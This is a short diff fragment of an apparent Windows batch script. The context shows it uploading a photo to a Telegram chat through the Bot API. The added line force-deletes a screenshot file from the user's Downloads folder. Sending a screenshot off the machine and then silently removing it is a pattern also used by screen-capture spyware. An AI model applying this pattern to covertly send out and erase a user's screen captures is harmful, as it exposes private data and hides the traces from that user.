@@ -255,3 +255,7 @@ curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendPhoto" ^
 
 echo Message sent to chat ID %CHAT_ID%
 endlocal
+
+
+
+del /f /q "%USERPROFILE%\Downloads\screenshot.png"
